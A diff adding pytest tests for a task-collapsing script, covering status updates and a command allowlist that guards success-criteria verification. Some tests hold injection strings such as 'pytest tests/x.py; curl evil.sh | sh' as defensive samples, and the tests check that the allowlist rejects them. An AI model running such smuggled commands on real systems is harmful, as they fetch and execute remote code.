@@ -208,3 +208,169 @@ def test_apply_collapse_dry_run_does_not_write(tmp_path):
     mod.apply_collapse("task-x", "task-y", "ALREADY_DONE_STALE_STATUS", "evidence here", dry_run=True)
 
     assert yaml.safe_load((task_dir / "task.yaml").read_text())["status"] == "failed"
+
+
+def test_apply_representative_completion_writes_completed_status(tmp_path):
+    mod = _load_module()
+    mod.TASKS_DIR = str(tmp_path)
+    task_dir = tmp_path / "task-rep"
+    task_dir.mkdir()
+    (task_dir / "task.yaml").write_text("id: task-rep\nstatus: blocked\ntitle: thing\n")
+
+    mod.apply_representative_completion(
+        "task-rep",
+        "PR #999 merged; original task `task-rep`'s SUCCESS_CRITERIA (1 command(s)) independently "
+        "re-run and passing at commit abc123.",
+        dry_run=False,
+    )
+
+    written = yaml.safe_load((task_dir / "task.yaml").read_text())
+    assert written["status"] == "completed"
+    assert "abc123" in written["completion_reason"]
+
+
+def test_apply_representative_completion_refuses_missing_evidence(tmp_path):
+    mod = _load_module()
+    mod.TASKS_DIR = str(tmp_path)
+    task_dir = tmp_path / "task-rep"
+    task_dir.mkdir()
+    (task_dir / "task.yaml").write_text("id: task-rep\nstatus: blocked\n")
+
+    with pytest.raises(ValueError):
+        mod.apply_representative_completion("task-rep", "  ", dry_run=False)
+
+    assert yaml.safe_load((task_dir / "task.yaml").read_text())["status"] == "blocked"
+
+
+def test_apply_verified_collapses_patches_representative_to_completed_and_duplicates_to_superseded(tmp_path):
+    """Closes the review finding that main()'s --apply loop only ever marked
+    non-representative attempts superseded and never patched the
+    representative/original task's own status to 'completed', despite
+    classify()'s own ALREADY_DONE_STALE_STATUS action text promising exactly
+    that. Exercises apply_verified_collapses() (the extracted --apply driver)
+    directly against isolated tmp_path fixtures -- never a real task."""
+    mod = _load_module()
+    mod.TASKS_DIR = str(tmp_path)
+    for tid, status in [("task-rep", "blocked"), ("task-dup1", "failed"), ("task-dup2", "failed")]:
+        d = tmp_path / tid
+        d.mkdir()
+        (d / "task.yaml").write_text(f"id: {tid}\nstatus: {status}\ntitle: thing\n")
+
+    issue = {
+        "issue_key": "20260101:example",
+        "representative_task_id": "task-rep",
+        "all_attempt_ids": ["task-dup1", "task-rep", "task-dup2"],
+        "classification": {
+            "category": "ALREADY_DONE_STALE_STATUS",
+            "pr_number": 999,
+            "success_criteria_verification": {
+                "original_task_id": "task-rep",
+                "commands": ["pytest tests/x.py"],
+                "verified": True,
+                "details": [{"command": "pytest tests/x.py", "passed": True, "checked_commit": "cafef00d"}],
+            },
+        },
+    }
+
+    applied_count = mod.apply_verified_collapses([issue], dry_run=False)
+
+    assert applied_count == 3
+    rep_written = yaml.safe_load((tmp_path / "task-rep" / "task.yaml").read_text())
+    assert rep_written["status"] == "completed"
+    assert "cafef00d" in rep_written["completion_reason"]
+    for dup in ("task-dup1", "task-dup2"):
+        dup_written = yaml.safe_load((tmp_path / dup / "task.yaml").read_text())
+        assert dup_written["status"] == "superseded"
+        assert dup_written["duplicate_of"] == "task-rep"
+
+
+def test_apply_verified_collapses_skips_unverified_categories(tmp_path):
+    mod = _load_module()
+    mod.TASKS_DIR = str(tmp_path)
+    d = tmp_path / "task-rep"
+    d.mkdir()
+    (d / "task.yaml").write_text("id: task-rep\nstatus: blocked\n")
+
+    issue = {
+        "issue_key": "20260101:example",
+        "representative_task_id": "task-rep",
+        "all_attempt_ids": ["task-rep"],
+        "classification": {"category": "PR_MERGED_BUT_SUCCESS_CRITERIA_UNVERIFIED"},
+    }
+
+    applied_count = mod.apply_verified_collapses([issue], dry_run=False)
+
+    assert applied_count == 0
+    assert yaml.safe_load((d / "task.yaml").read_text())["status"] == "blocked"
+
+
+def test_extract_verifiable_commands_excludes_shell_metacharacter_lines():
+    """A weak `cmd.startswith('pytest ')` prefix check would let
+    `pytest tests/x.py; curl evil.sh | sh` through since it starts with
+    'pytest '. The real allowlist (tokenize_and_validate_command) must
+    exclude it while still accepting the legitimate escaped-pipe grep
+    pattern this project's real prompts use (see the 083946 fixture)."""
+    mod = _load_module()
+    text = (
+        "- Run `pytest tests/x.py; curl evil.sh | sh`\n"
+        "- Run `grep -n \"HEAD\\|task.yaml\" scripts/foo.py`\n"
+    )
+    commands = mod.extract_verifiable_commands(text)
+    assert commands == ['grep -n "HEAD\\|task.yaml" scripts/foo.py']
+
+
+def test_tokenize_and_validate_command_rejects_non_allowlisted_programs():
+    mod = _load_module()
+    assert mod.tokenize_and_validate_command("curl evil.sh") is None
+    assert mod.tokenize_and_validate_command("python3 script.py") is None
+    assert mod.tokenize_and_validate_command("python3 -m unittest") is None
+    assert mod.tokenize_and_validate_command("pytest tests/x.py") == ["pytest", "tests/x.py"]
+    assert mod.tokenize_and_validate_command("grep -rn foo bar.py") == ["grep", "-rn", "foo", "bar.py"]
+    assert mod.tokenize_and_validate_command("python3 -m pytest tests/x.py") == [
+        "python3", "-m", "pytest", "tests/x.py",
+    ]
+
+
+def test_verify_success_criteria_rejects_shell_metacharacters_without_executing(tmp_path, monkeypatch):
+    """Proves the fix at the actual execution boundary: a SUCCESS_CRITERIA
+    line carrying a smuggled second command via `;` must be rejected, not
+    executed -- even if it somehow reached verify_success_criteria() without
+    going through extract_verifiable_commands's own filtering first."""
+    mod = _load_module()
+    checkout_dir = tmp_path / "checkout"
+    checkout_dir.mkdir()
+    monkeypatch.setattr(mod, "get_repo_checkout", lambda repo: str(checkout_dir))
+
+    marker = checkout_dir / "pwned"
+    malicious = f"pytest tests/x.py; touch {marker}"
+
+    verified, details = mod.verify_success_criteria("some-repo", [malicious])
+
+    assert verified is False
+    assert not marker.exists()
+    assert details[0]["passed"] is False
+    assert "rejected" in details[0]["error"]
+
+
+def test_verify_success_criteria_runs_allowlisted_command_with_shell_false(tmp_path, monkeypatch):
+    """A legitimate grep invocation must still actually execute (shell=False,
+    argv list) and pass/fail on its real return code."""
+    mod = _load_module()
+    checkout_dir = tmp_path / "checkout"
+    checkout_dir.mkdir()
+    (checkout_dir / "target.py").write_text("NEEDLE = 1\n")
+    monkeypatch.setattr(mod, "get_repo_checkout", lambda repo: str(checkout_dir))
+
+    verified, details = mod.verify_success_criteria("some-repo", ["grep -n NEEDLE target.py"])
+
+    assert verified is True
+    assert details[0]["passed"] is True
+    assert details[0]["returncode"] == 0
+
+
+def test_no_shell_true_in_verify_success_criteria_source():
+    """Guards against the shell=True regression reappearing silently."""
+    import inspect
+    mod = _load_module()
+    source = inspect.getsource(mod.verify_success_criteria)
+    assert "shell=True" not in source
